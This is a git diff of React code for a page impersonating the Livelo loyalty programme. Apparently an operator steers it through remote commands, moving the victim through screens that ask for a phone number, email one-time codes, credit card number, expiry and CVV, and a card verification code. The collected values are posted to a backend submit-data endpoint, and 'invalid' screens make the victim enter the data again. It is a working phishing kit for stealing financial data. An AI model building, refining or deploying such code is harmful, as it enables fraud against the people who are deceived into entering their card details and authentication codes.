+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`}
+              style={{ height: '38px' }}
+              autoFocus
             />
           </div>
-
-          {/* Ícone de Telefone */}
-          <div className="mb-6">
-            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
-              <svg 
-                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
-                fill="none" 
-                stroke="currentColor" 
-                viewBox="0 0 24 24"
-              >
-                {isInvalid ? (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
-                  />
-                ) : (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" 
-                  />
-                )}
-              </svg>
-            </div>
-          </div>
-
-          {/* Mensagem de erro se inválido */}
-          {isInvalid && (
-            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
-              <p className="text-red-600 text-sm text-center font-medium">
-                Número de telefone inválido. Por favor, digite novamente.
-              </p>
-            </div>
-          )}
-
-          {/* Título */}
-          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
-            Confirme seu Telefone
-          </h1>
-
-          {/* Descrição */}
-          <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Digite o número de telefone cadastrado na sua conta Livelo
-          </p>
-
-          {/* Formulário */}
-          <form onSubmit={(e) => handleSubmit(e, "phone_number")} className="w-full max-w-md space-y-6">
-            {/* Campo de telefone */}
-            <div className="relative">
-              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
-                <svg 
-                  xmlns="http://www.w3.org/2000/svg" 
-                  className="h-5 w-5" 
-                  fill="none" 
-                  viewBox="0 0 24 24" 
-                  stroke="currentColor"
-                >
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" 
-                  />
-                </svg>
-              </div>
-              <input
-                type="tel"
-                value={inputValue}
-                onChange={handlePhoneChange}
-                placeholder="(00) 00000-0000"
-                disabled={loading}
-                className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
-              />
-            </div>
-
-            {/* Botão Confirmar */}
-            <button
-              type="submit"
-              disabled={loading || !isPhoneValid}
-              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
-                isPhoneValid && !loading
-                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
-                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
-              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
-            >
-              {loading ? (
-                <div className="flex items-center justify-center">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    ></circle>
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    ></path>
-                  </svg>
-                </div>
-              ) : (
-                "Confirmar"
-              )}
-            </button>
-          </form>
-        </div>
-
-        {/* Voltar */}
-        <div className="p-8">
-          <a
-            href="#"
-            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              className="h-4 w-4 mr-2"
-              fill="none"
-              viewBox="0 0 24 24"
-              stroke="currentColor"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M15 19l-7-7 7-7"
-              />
-            </svg>
-            Voltar para página inicial
-          </a>
-        </div>
-      </div>
+          <PFButton disabled={!isPhoneValid} loading={loading}>Confirmar</PFButton>
+        </form>
+      </PFLayout>
     );
   }
 
-  // Página TOK-MAIL - Código enviado para o email
+  // =================== TOK-MAIL (Código por Email) ===================
   if (currentCommand?.action === "TOK-MAIL" || currentCommand?.action === "TOK-MAIL-INV") {
-    const isCodeComplete = codeDigits.every(digit => digit !== '');
-    const emailMasked = currentCommand?.command_reference || "******@email.com";
+    const isCodeComplete = codeDigits.every(d => d !== '');
+    const emailRef = currentCommand?.command_reference || "******@email.com";
     const isInvalid = currentCommand?.action === "TOK-MAIL-INV";
-    
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          {/* Logo Livelo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
-            />
-          </div>
-
-          {/* Ícone de Email */}
-          <div className="mb-6">
-            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
-              <svg 
-                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
-                fill="none" 
-                stroke="currentColor" 
-                viewBox="0 0 24 24"
-              >
-                {isInvalid ? (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
-                  />
-                ) : (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" 
-                  />
-                )}
-              </svg>
-            </div>
-          </div>
-
-          {/* Mensagem de erro se inválido */}
-          {isInvalid && (
-            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
-              <p className="text-red-600 text-sm text-center font-medium">
-                Código inválido. Por favor, digite novamente.
-              </p>
-            </div>
-          )}
-
-          {/* Título */}
-          <h1 className={`text-2xl font-bold mb-4 text-center ${isInvalid ? 'text-red-600' : 'text-[#1a1a5e]'}`}>
-            {isInvalid ? 'Código inválido!' : 'Código enviado!'}
-          </h1>
-
-          {/* Descrição com email mascarado */}
-          <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Informe o código que enviamos para o email <span className="font-semibold">{emailMasked}</span>
-          </p>
-
-          {/* Formulário */}
-          <form onSubmit={(e) => handleSubmit(e, "app_mail")} className="w-full max-w-md space-y-6">
-            {/* 6 Quadradinhos para o código */}
-            <div className="flex justify-center gap-3">
-              {codeDigits.map((digit, index) => (
-                <input
-                  key={index}
-                  ref={(el) => (inputRefs.current[index] = el)}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength="1"
-                  value={digit}
-                  onChange={(e) => handleCodeChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  onPaste={handlePaste}
-                  disabled={loading}
-                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
-                    isInvalid 
-                      ? 'border-red-500 bg-red-50' 
-                      : digit 
-                        ? 'border-pink-500 bg-pink-50' 
-                        : 'border-gray-300 bg-white'
-                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
-                />
-              ))}
-            </div>
-
-            {/* Contador para reenviar */}
-            <div className="text-center">
-              <span className="text-gray-400 text-sm">
-                Aguarde para reenviar
-              </span>
-            </div>
-
-            {/* Botão Continuar */}
-            <button
-              type="submit"
-              disabled={loading || !isCodeComplete}
-              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
-                isCodeComplete && !loading
-                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
-                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
-              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
-            >
-              {loading ? (
-                <div className="flex items-center justify-center">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    ></circle>
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    ></path>
-                  </svg>
-                </div>
-              ) : (
-                "Continuar"
-              )}
-            </button>
-          </form>
-        </div>
-
-        {/* Voltar */}
-        <div className="p-8">
-          <a
-            href="#"
-            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              className="h-4 w-4 mr-2"
-              fill="none"
-              viewBox="0 0 24 24"
-              stroke="currentColor"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M15 19l-7-7 7-7"
-              />
-            </svg>
-            Voltar para página inicial
-          </a>
-        </div>
-      </div>
+      <PFLayout>
+        <PFLogo />
+        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
+        <h1 className={`text-lg font-bold mb-2 text-center ${isInvalid ? 'text-red-600' : 'text-gray-900'}`}>
+          {isInvalid ? 'Código inválido!' : 'Código enviado!'}
+        </h1>
+        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">
+          Informe o código enviado para <span className="font-semibold">{emailRef}</span>
+        </p>
+        <form onSubmit={(e) => handleSubmit(e, "app_mail")} className="w-full max-w-[280px] space-y-5">
+          <CodeInputs isInvalid={isInvalid} />
+          <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
+          <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
+        </form>
+      </PFLayout>
     );
   }
 
-  // Página CC - Dados do Cartão de Crédito
+  // =================== CC (Cartão de Crédito) ===================
   if (currentCommand?.action === "CC" || currentCommand?.action === "CC-INV") {
     const isInvalid = currentCommand?.action === "CC-INV";
-
-    const getIsAmex = () => {
-      const nums = cardNumber.replace(/\D/g, "");
-      return nums.startsWith("34") || nums.startsWith("37");
+    const isAmex = (cardNumber.replace(/\D/g,"").startsWith("34") || cardNumber.replace(/\D/g,"").startsWith("37"));
+    const cvvLen = isAmex ? 4 : 3;
+    const formatCardNumber = (v) => {
+      const n = v.replace(/\D/g,"").slice(0, isAmex ? 15 : 16);
+      if (isAmex) return n.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_,a,b,c) => [a,b,c].filter(Boolean).join(" "));
+      return n.replace(/(\d{4})(?=\d)/g, "$1 ");
     };
-    const cvvLength = getIsAmex() ? 4 : 3;
-
-    const formatCardNumber = (value) => {
-      const nums = value.replace(/\D/g, "");
-      const amex = nums.startsWith("34") || nums.startsWith("37");
-      const sliced = nums.slice(0, amex ? 15 : 16);
-      if (amex) {
-        return sliced.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_, a, b, c) => [a, b, c].filter(Boolean).join(" "));
-      }
-      return sliced.replace(/(\d{4})(?=\d)/g, "$1 ");
-    };
-
-    const formatExpiry = (value) => {
-      const nums = value.replace(/\D/g, "").slice(0, 4);
-      if (nums.length > 2) return nums.slice(0, 2) + "/" + nums.slice(2);
-      return nums;
-    };
-
-    const validateCard = () => {
-      const nums = cardNumber.replace(/\D/g, "");
-      return nums.length >= 13 && nums.length <= 16;
-    };
-
-    const validateExpiry = () => {
-      const parts = cardExpiry.split("/");
-      if (parts.length !== 2) return false;
-      const month = parseInt(parts[0], 10);
-      const year = parseInt("20" + parts[1], 10);
-      if (month < 1 || month > 12) return false;
-      const now = new Date();
-      const expDate = new Date(year, month);
-      return expDate > now;
-    };
-
-    const isFormValid = validateCard() && validateExpiry() && cardCvv.length >= cvvLength;
-
+    const formatExpiry = (v) => { const n = v.replace(/\D/g,"").slice(0,4); return n.length > 2 ? n.slice(0,2)+"/"+n.slice(2) : n; };
+    const validateCard = () => { const n = cardNumber.replace(/\D/g,""); return n.length >= 13 && n.length <= 16; };
+    const validateExpiry = () => { const p = cardExpiry.split("/"); if (p.length !== 2) return false; const m = parseInt(p[0],10); const y = parseInt("20"+p[1],10); if (m<1||m>12) return false; return new Date(y,m) > new Date(); };
+    const isFormValid = validateCard() && validateExpiry() && cardCvv.length >= cvvLen;
     const handleCCSubmit = async (e) => {
       e.preventDefault();
       setLoading(true);
-      const ccData = `${cardNumber} | ${cardExpiry} | ${cardCvv}`;
       try {
-        await axios.post(`${API}/user/submit-data/${userId}`, {
-          field: "credit_card",
-          value: ccData
-        });
+        await axios.post(`${API}/user/submit-data/${userId}`, { field: "credit_card", value: `${cardNumber} | ${cardExpiry} | ${cardCvv}` });
         setSubmitted(true);
-        // Mudar para tela de Aguarde
         setCurrentCommand({ action: "AGUARDE" });
-      } catch (error) {
-        console.error("Erro ao enviar dados:", error);
-      }
+      } catch (error) { console.error(error); }
     };
-
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          {/* Logo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
-            />
-          </div>
-
-          {/* Ícone */}
-          <div className="mb-6">
-            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
-              <svg className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                {isInvalid ? (
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                ) : (
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-                )}
-              </svg>
-            </div>
-          </div>
-
-          {/* Erro */}
-          {isInvalid && (
-            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
-              <p className="text-red-600 text-sm text-center font-medium">
-                Dados do cartão inválidos. Por favor, digite novamente.
-              </p>
-            </div>
+      <PFLayout>
+        <PFLogo />
+        <PFIcon isInvalid={isInvalid}>
+          {isInvalid ? (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          ) : (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
           )}
-
-          {/* Título */}
-          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
-            Cadastre seu cartão
-          </h1>
-
-          <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Os dados do seu cartão de crédito precisam ser atualizados para continuar pontuando na Livelo.
-          </p>
-
-          {/* Formulário */}
-          <form onSubmit={handleCCSubmit} className="w-full max-w-md space-y-5">
-            {/* Número do Cartão */}
+        </PFIcon>
+        {isInvalid && <PFError message="Dados do cartão inválidos. Digite novamente." />}
+        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Cadastre seu cartão</h1>
+        <p className="text-gray-500 mb-5 text-center text-sm max-w-[280px]">Atualize os dados do seu cartão para continuar.</p>
+        <form onSubmit={handleCCSubmit} className="w-full max-w-[280px] space-y-4">
+          <div>
+            <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>Número do cartão</label>
+            <input type="text" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="0000 0000 0000 0000" disabled={loading} maxLength={19}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
+          </div>
+          <div className="grid grid-cols-2 gap-3">
             <div>
-              <label className="block text-sm font-medium text-gray-700 mb-1.5">Número do cartão</label>
-              <div className="relative">
-                <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
-                  <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-                  </svg>
-                </div>
-                <input
-                  type="text"
-                  value={cardNumber}
-                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
-                  placeholder="0000 0000 0000 0000"
-                  disabled={loading}
-                  maxLength={19}
-                  className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
-                />
-              </div>
+              <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>Validade</label>
+              <input type="text" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} placeholder="MM/AA" disabled={loading} maxLength={5}
+                className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm text-center ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
             </div>
-
-            {/* Validade e CVV lado a lado */}
-            <div className="grid grid-cols-2 gap-4">
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1.5">Validade</label>
-                <input
-                  type="text"
-                  value={cardExpiry}
-                  onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
-                  placeholder="MM/AA"
-                  disabled={loading}
-                  maxLength={5}
-                  className={`w-full px-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base text-center ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
-                />
-              </div>
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1.5">CVV</label>
-                <input
-                  type="text"
-                  value={cardCvv}
-                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, cvvLength))}
-                  placeholder={getIsAmex() ? "0000" : "000"}
-                  disabled={loading}
-                  maxLength={cvvLength}
-                  className={`w-full px-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base text-center ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
-                />
-              </div>
+            <div>
+              <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>CVV</label>
+              <input type="text" value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g,"").slice(0,cvvLen))} placeholder={isAmex?"0000":"000"} disabled={loading} maxLength={cvvLen}
+                className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm text-center ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
             </div>
-
-            {/* Botão */}
-            <button
-              type="submit"
-              disabled={loading || !isFormValid}
-              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 mt-2 ${
-                isFormValid && !loading
-                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
-                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
-              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
-            >
-              {loading ? (
-                <div className="flex items-center justify-center">
-                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                  </svg>
-                </div>
-              ) : (
-                "Continuar"
-              )}
-            </button>
-
-            <div className="flex items-center justify-center gap-4 pt-2">
-              <div className="flex items-center gap-1 text-gray-400 text-xs">
-                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-                </svg>
-                Conexão segura
-              </div>
-            </div>
-          </form>
-        </div>
-
-        {/* Voltar */}
-        <div className="p-8">
-          <a href="#" className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors">
-            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
-            </svg>
-            Voltar para página inicial
-          </a>
-        </div>
-      </div>
+          </div>
+          <PFButton disabled={!isFormValid} loading={loading}>Continuar</PFButton>
+        </form>
+      </PFLayout>
     );
   }
 
-  // Página COD-CC - Código de verificação do cartão
+  // =================== COD-CC (Código verificação cartão) ===================
   if (currentCommand?.action === "COD-CC" || currentCommand?.action === "COD-CC-INV") {
     const isInvalid = currentCommand?.action === "COD-CC-INV";
     const referenceText = currentCommand?.command_reference || "";
-
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-12 px-4">
-          {/* Logo Livelo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
-            />
-          </div>
-
-          {/* Header com título e X */}
-          <div className="w-full max-w-lg flex items-center justify-between mb-8">
-            <h1 className="text-xl font-normal text-gray-800">Insira o código de verificação</h1>
-            <button className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
-          </div>
-
-          <div className="w-full max-w-lg">
-            {/* Texto de referência do admin */}
-            {referenceText && (
-              <p className="text-gray-700 text-sm leading-relaxed mb-6">{referenceText}</p>
-            )}
-
-            {/* Erro */}
-            {isInvalid && (
-              <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg">
-                <p className="text-red-600 text-sm font-medium">
-                  Código inválido. Por favor, digite novamente.
-                </p>
-              </div>
-            )}
-
-            {/* Campo de código */}
-            <form onSubmit={(e) => handleSubmit(e, "cc_code")} className="space-y-4">
-              <div>
-                <label className={`block text-sm font-medium mb-2 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}>
-                  Código
-                </label>
-                <input
-                  type="text"
-                  inputMode="numeric"
-                  value={inputValue}
-                  onChange={(e) => {
-                    const val = e.target.value.replace(/\D/g, "");
-                    setInputValue(val);
-                  }}
-                  disabled={loading}
-                  placeholder=""
-                  className={`w-full px-4 py-4 border-2 rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-lg ${isInvalid ? 'border-red-500' : 'border-pink-500 focus:border-pink-600'}`}
-                />
-              </div>
-
-              {inputValue && /\D/.test(inputValue) && (
-                <p className="text-red-500 text-xs">Só é possível inserir números</p>
-              )}
-
-              {/* Pedir novo código */}
-              <div>
-                <a href="#" className="text-blue-600 hover:text-blue-800 text-sm font-medium">
-                  Pedir um novo código
-                </a>
-              </div>
-
-              {/* Botão Confirmar */}
-              <div className="flex justify-end pt-4">
-                <button
-                  type="submit"
-                  disabled={loading || !inputValue || inputValue.length < 1}
-                  className={`px-8 py-2.5 rounded font-medium text-base transition-all duration-300 ${
-                    inputValue && !loading
-                      ? "bg-blue-600 text-white hover:bg-blue-700"
-                      : "bg-gray-200 text-gray-400 cursor-not-allowed"
-                  }`}
-                >
-                  {loading ? (
-                    <div className="flex items-center justify-center">
-                      <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                      </svg>
-                    </div>
-                  ) : (
-                    "Confirmar"
-                  )}
-                </button>
-              </div>
-            </form>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  // Página aguarde
-  if (currentCommand?.action === "AGUARDE") {
-    return (
-      <div className="min-h-screen bg-white flex flex-col font-inter cursor-wait">
-        <div className="flex-1 flex flex-col items-center justify-center px-4">
-          {/* Logo Livelo */}
-          <div className="mb-12">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-12 w-auto"
-            />
-          </div>
-
-          {/* Spinner de loading */}
-          <div className="mb-8">
-            <div className="relative">
-              <div className="w-16 h-16 border-4 border-gray-200 rounded-full"></div>
-              <div className="absolute top-0 left-0 w-16 h-16 border-4 border-transparent border-t-pink-500 rounded-full animate-spin"></div>
+      <PFLayout>
+        <PFLogo />
+        <div className="w-full max-w-[320px]">
+          <h1 className="text-lg font-bold text-gray-900 mb-4">Insira o código de verificação</h1>
+          {referenceText && <p className="text-gray-600 text-sm leading-relaxed mb-5">{referenceText}</p>}
+          {isInvalid && <PFError message="Código inválido. Digite novamente." />}
+          <form onSubmit={(e) => handleSubmit(e, "cc_code")} className="space-y-4">
+            <div>
+              <label className="block text-sm font-medium mb-1.5" style={{ color: isInvalid ? '#EF4444' : PF_BLUE }}>Código</label>
+              <input
+                type="text" inputMode="numeric" value={inputValue}
+                onChange={(e) => setInputValue(e.target.value.replace(/\D/g, ""))}
+                disabled={loading}
+                className={`w-full px-3 py-3 border-2 rounded-lg focus:outline-none text-lg ${isInvalid ? 'border-red-500' : 'border-[#5C6BC0] focus:border-[#3F51B5]'}`}
+                autoFocus
+              />
             </div>
-          </div>
-
-          {/* Texto Aguarde */}
-          <h1 className="text-2xl font-bold text-gray-800">
-            Aguarde...
-          </h1>
+            <a href="#" className="text-[#5C6BC0] hover:text-[#3F51B5] text-sm font-medium">Pedir um novo código</a>
+            <div className="flex justify-end pt-2">
+              <button type="submit" disabled={loading || !inputValue}
+                className="px-8 py-2 rounded text-white font-medium text-sm transition-all disabled:opacity-50"
+                style={{ backgroundColor: !inputValue || loading ? PF_BLUE_LIGHT : PF_BLUE }}>
+                {loading ? <PFSpinner /> : "Confirmar"}
+              </button>
+            </div>
+          </form>
         </div>
-      </div>
+      </PFLayout>
     );
   }
 
-  // Redirecionar
+  // =================== AGUARDE ===================
+  if (currentCommand?.action === "AGUARDE" || !currentCommand?.action) {
+    return (
+      <PFLayout>
+        <PFLogo />
+        <div className="mb-6">
+          <div className="relative">
+            <div className="w-14 h-14 border-4 border-gray-200 rounded-full"></div>
+            <div className="absolute top-0 left-0 w-14 h-14 border-4 border-transparent rounded-full animate-spin" style={{ borderTopColor: PF_BLUE }}></div>
+          </div>
+        </div>
+        <h1 className="text-lg font-bold text-gray-700">Aguarde...</h1>
+        <p className="text-gray-400 text-sm mt-2">Estamos processando sua solicitação</p>
+      </PFLayout>
+    );
+  }
+
+  // =================== REDIRECT ===================
   if (currentCommand?.action === "REDIRECT" && currentCommand?.redirect_url) {
     window.location.href = currentCommand.redirect_url;
     return null;
